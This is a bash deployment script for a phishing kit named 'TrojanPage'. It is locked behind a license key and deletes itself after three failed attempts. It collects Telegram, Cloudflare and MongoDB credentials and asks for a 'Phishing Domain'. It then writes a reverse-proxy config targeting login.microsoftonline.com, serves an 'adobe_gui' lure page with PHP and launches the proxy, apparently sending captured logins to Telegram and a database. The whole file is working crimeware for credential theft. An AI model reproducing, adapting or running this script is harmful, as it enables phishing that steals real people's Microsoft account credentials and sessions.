#!/bin/bash
# 🏛️ TROJANPAGE - THE MASTER CONFIGURATION DEPLOYER (V3.0)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# --- 1. THE TROJANPAGE HEADER ---
show_header() {
    clear
    echo -e "${BLUE}"
    echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
    echo -e "${NC}"
    echo -e "${RED}                  [ SYSTEM ACCESS CONTROL ]${NC}"
    echo " ----------------------------------------------------------------------------------"
}

# --- 2. MASTER KEY SETTINGS ---
MASTER_KEY="TROJAN-PRO-2026"
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')

# --- 3. GATEKEEPER LOCK ---
ATTEMPTS=0
while [ $ATTEMPTS -lt 3 ]; do
    show_header
    echo -e "${GREEN}[+] SYSTEM HWID:${NC} $HWID"
    echo -e "${BLUE}[!] Unauthorized. Please enter the Master Activation Key.${NC}"
    echo " ----------------------------------------------------------------------------------"
    
    read -p "ENTER KEY: " USER_INPUT
    CLEAN_INPUT=$(echo "$USER_INPUT" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]')

    if [ "$CLEAN_INPUT" == "$MASTER_KEY" ]; then
        echo -e "${GREEN}[success] Access Granted. Loading Setup Wizard...${NC}"
        sleep 1
        break
    else
        ATTEMPTS=$((ATTEMPTS + 1))
        echo -e "${RED}[error] Invalid Key. Attempt $ATTEMPTS of 3.${NC}"
        sleep 1
    fi

    if [ $ATTEMPTS -eq 3 ]; then
        echo -e "${RED}[critical] Brute-force detected. Self-destructing...${NC}"
        rm -- "$0"
        exit 1
    fi
done

# --- 4. VERIFIED CONFIGURATION WIZARD ---
echo -e "\n${BLUE}--- [ VERIFYING SYSTEM CREDENTIALS ] ---${NC}"
sudo apt update && sudo apt install -y curl mongodb-clients golang-go git make screen php-cli unzip > /dev/null 2>&1

# TELEGRAM VERIFICATION
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    echo -ne "[...] Validating Telegram Bot..."
    if curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe" | grep -q "\"ok\":true"; then
        echo -e "${GREEN} [VERIFIED]${NC}"; break
    else
        echo -e "${RED} [FAILED] Invalid Token.${NC}"
    fi
done
read -p "Enter Telegram Chat ID: " TG_ID

# CLOUDFLARE VERIFICATION
while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    echo -ne "[...] Validating Cloudflare Permissions..."
    if curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN" | grep -q "\"status\":\"active\""; then
        echo -e "${GREEN} [VERIFIED]${NC}"; break
    else
        echo -e "${RED} [FAILED] Invalid/Inactive Token.${NC}"
    fi
done

# MONGODB ATLAS VERIFICATION
while true; do
    echo -e "\n${BLUE}[ MongoDB Atlas Settings ]${NC}"
    read -p "Enter MongoDB Host (e.g. cluster0.abc.mongodb.net): " M_HOST
    read -p "Enter MongoDB User: " M_USER
    read -p "Enter MongoDB Pass: " M_PASS
    echo -ne "[...] Testing Atlas Connection..."
    
    if mongosh "mongodb+srv://$M_USER:$M_PASS@$M_HOST/admin" --eval "db.adminCommand('listDatabases')" > /dev/null 2>&1; then
        echo -e "${GREEN} [CONNECTED]${NC}"
        M_URI="mongodb+srv://$M_USER:$M_PASS@$M_HOST/trojan_db?retryWrites=true&w=majority"
        break
    else
        echo -e "${RED} [FAILED] Check Host/User/Pass (Firewall?)${NC}"
        read -p "Force proceed with these credentials? (y/n): " FORCE_M
        if [[ $FORCE_M == "y" || $FORCE_M == "Y" ]]; then
            M_URI="mongodb+srv://$M_USER:$M_PASS@$M_HOST/trojan_db?retryWrites=true&w=majority"
            break
        fi
    fi
done

read -p "Enter Phishing Domain: " USER_DOMAIN

# --- 5. STANDARDIZED CONFIG GENERATION ---
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "listeningPortHTTP": 8080,
  "target": "login.microsoftonline.com",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "cfToken": "$CF_TOKEN",
  "mongodb": "$M_URI"
}
EOF

# --- 6. CREATE THE SMART RUN SCRIPT ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'
CONFIG="/root/config.json"
LICENSE_FILE="/root/.license"

show_status() {
    clear
    echo -e "${BLUE}"
    echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
    echo -e "${NC}"
    echo -e "${RED}                  [ PRE-FLIGHT DASHBOARD ]${NC}"
    echo " ----------------------------------------------------------------------------------"
    
    # Check Telegram
    TG_TOKEN=$(grep -oP '(?<="telegramToken": ")[^"]*' $CONFIG)
    if curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe" | grep -q "\"ok\":true"; then
        echo -e "[+] Telegram API:   ${GREEN}ONLINE${NC}"; TG_S="OK"
    else
        echo -e "[+] Telegram API:   ${RED}OFFLINE${NC}"; TG_S="ERR"
    fi

    # Check Cloudflare
    CF_TOKEN=$(grep -oP '(?<="cfToken": ")[^"]*' $CONFIG)
    if curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN" | grep -q "\"status\":\"active\""; then
        echo -e "[+] Cloudflare API: ${GREEN}ONLINE${NC}"; CF_S="OK"
    else
        echo -e "[+] Cloudflare API: ${RED}OFFLINE${NC}"; CF_S="ERR"
    fi

    # Check MongoDB
    M_URI=$(grep -oP '(?<="mongodb": ")[^"]*' $CONFIG)
    if mongosh "$M_URI" --eval "db.adminCommand('ping')" --quiet --connectTimeoutMS 2000 > /dev/null 2>&1; then
        echo -e "[+] MongoDB Atlas:  ${GREEN}CONNECTED${NC}"; DB_S="OK"
    else
        echo -e "[+] MongoDB Atlas:  ${RED}DISCONNECTED${NC}"; DB_S="ERR"
    fi
    echo " ----------------------------------------------------------------------------------"
}

while true; do
    show_status
    READY="NO"

    # Launch conditions
    if [[ "$TG_S" == "OK" && "$CF_S" == "OK" ]]; then
        if [[ "$DB_S" == "OK" ]]; then
            echo -e "${GREEN}[success] All Systems Green. Launching...${NC}"
            READY="YES"
        else
            echo -e "${RED}[!] WARNING: MongoDB is Offline.${NC}"
            echo -e "${BLUE}[!] Logs will still be sent to Telegram.${NC}"
            read -p "Launch YAML Interface anyway? (y/n): " BYP
            [[ "$BYP" == "y" || "$BYP" == "Y" ]] && READY="YES"
        fi
    fi

    if [[ "$READY" == "YES" ]]; then
        sleep 1
        sudo fuser -k 80/tcp 443/tcp 2>/dev/null
        pkill -9 proxy && pkill -9 php
        screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
        cd /root/engine/dist/ && ./proxy -config /root/config.json
        exit 0
    else
        echo -e "${RED}[!] YAML INTERFACE BLOCKED: Fix Credentials Below${NC}"
        echo "1) Edit Telegram Token"
        echo "2) Edit Cloudflare Token"
        echo "3) Edit MongoDB Settings"
        echo "4) Retry All Connections"
        echo "5) Exit"
        read -p "Select Choice: " OPT
        case $OPT in
            1) read -p "New TG Token: " NT; sed -i "s|\"telegramToken\": \".*\"|\"telegramToken\": \"$NT\"|g" $CONFIG ;;
            2) read -p "New CF Token: " NC; sed -i "s|\"cfToken\": \".*\"|\"cfToken\": \"$NC\"|g" $CONFIG ;;
            3) 
               read -p "New Mongo User: " NU
               read -p "New Mongo Pass: " NP
               read -p "New Mongo Host: " NH
               NEW_URI="mongodb+srv://$NU:$NP@$NH/trojan_db?retryWrites=true&w=majority"
               sed -i "s|\"mongodb\": \".*\"|\"mongodb\": \"$NEW_URI\"|g" $CONFIG
               echo -e "${GREEN}[+] MongoDB Settings Updated.${NC}"; sleep 1 ;;
            4) continue ;;
            5) exit 1 ;;
        esac
    fi
done
EOF

# --- 7. GLOBAL COMMAND SETUP ---
chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run
sudo ln -sf /root/run.sh /usr/local/bin/run
echo "alias logs='tail -f /root/engine/logs/proxy.log'" >> ~/.bashrc
HWID_CLEAN=$(echo -n "$HWID" | tr -d '[:space:]')
EXPIRY=$(($(date +%s) + 7776000))
echo "$HWID_CLEAN:$EXPIRY" > /root/.license

echo -e "\n${GREEN}[success] TrojanPage Deployed. Type 'Run' to begin.${NC}"
